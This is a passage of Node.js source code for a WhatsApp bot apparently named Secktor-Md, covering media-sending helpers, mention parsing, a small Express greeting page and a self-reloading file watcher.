                    //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
                let type = await FileType.fromBuffer(data) || {
                    mime: 'application/octet-stream',
                    ext: '.bin'
                }
                let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
                if (data && save) fs.promises.writeFile(filename, data)
                return {
                    res,
                    filename,
                    size: await getSizeMedia(data),
                    ...type,
                    data
                }

            }
            //========================================================================================================================================
        Void.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
                let types = await Void.getFile(PATH, true)
                let { filename, size, ext, mime, data } = types
                let type = '',
                    mimetype = mime,
                    pathFile = filename
                if (options.asDocument) type = 'document'
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif.js')
                    let media = { mimetype: mime, data }
                    pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
                    await fs.promises.unlink(filename)
                    type = 'sticker'
                    mimetype = 'image/webp'
                } else if (/image/.test(mime)) type = 'image'
                else if (/video/.test(mime)) type = 'video'
                else if (/audio/.test(mime)) type = 'audio'
                else type = 'document'
                await Void.sendMessage(jid, {
                    [type]: { url: pathFile },
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options })
                return fs.promises.unlink(pathFile)
            }
            //========================================================================================================================================
        Void.parseMention = async(text) => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        return Void
    }

    syncdb().catch(err => console.log(err))
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Secktor-Md</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Hello from SamPandey001!
    </section>
  </body>
</html>
`
app.get("/", (req, res) => res.type('html').send(html));
app.listen(port, () => console.log(`Secktor Server listening on port http://localhost:${port}!`));
    //=============================[to get message of New Update of this file.]===================================================
    let file = require.resolve(__filename)
    fs.watchFile(file, () => {
        fs.unwatchFile(file)
        console.log(`Update ${__filename}`)
        delete require.cache[file]
        require(file)
    })
}, 3000)

function atob(str) {
  return Buffer.from(str, 'base64').toString('binary');
}
